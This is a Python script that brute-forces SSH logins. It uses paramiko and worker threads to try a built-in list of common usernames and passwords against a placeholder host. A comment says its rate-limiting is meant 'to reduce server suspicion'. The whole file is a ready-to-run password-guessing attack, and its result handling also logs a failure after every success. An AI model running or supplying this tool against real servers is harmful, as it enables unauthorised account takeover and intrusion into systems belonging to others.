import paramiko
import threading
import queue
import time

# Global configuration
rate_limit_delay = 1  # Seconds between attempts per thread
max_threads = 5  # Number of concurrent threads

def attempt_ssh_login(host, port, username, password, result_queue):
    """Attempt to login to SSH with given credentials."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, username, password, timeout=5)
        print(f"[+] Login successful: {username}@{host}:{port} with password '{password}'")
        result_queue.put((username, password, True))
    except paramiko.AuthenticationException:
        print(f"[-] Login failed for {username}@{host}:{port} with password '{password}'")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client.close()
    result_queue.put((username, password, False))

def worker(host, port, credentials_queue, result_queue):
    """Worker thread for processing login attempts."""
    while not credentials_queue.empty():
        username, password = credentials_queue.get()
        attempt_ssh_login(host, port, username, password, result_queue)
        time.sleep(rate_limit_delay)  # Rate limiting to reduce server suspicion

def main():
    # Target configuration
    host = "192.168.1.100"  # Replace with target host
    port = 22

    # Common usernames and passwords
    usernames = [
        "admin", "root", "user", "guest", "test", "support", "administrator", "webadmin"
    ]
    passwords = [
        "password", "123456", "admin", "letmein", "qwerty", "welcome", "password123", "root"
    ]

    # Build a queue of credentials
    credentials_queue = queue.Queue()
    for username in usernames:
        for password in passwords:
            credentials_queue.put((username, password))

    # Result queue for storing outcomes
    result_queue = queue.Queue()

    print(f"[*] Starting brute-force SSH attack on {host}:{port}")
    print(f"[*] Total combinations: {credentials_queue.qsize()}")
    
    # Create worker threads
    threads = []
    for _ in range(min(max_threads, credentials_queue.qsize())):
        thread = threading.Thread(target=worker, args=(host, port, credentials_queue, result_queue))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # Process results
    print("[*] Attack complete. Results:")
    while not result_queue.empty():
        username, password, success = result_queue.get()
        if success:
            print(f"    [+] Successful login: {username}:{password}")
        else:
            print(f"    [-] Failed attempt: {username}:{password}")

if __name__ == "__main__":
    main()
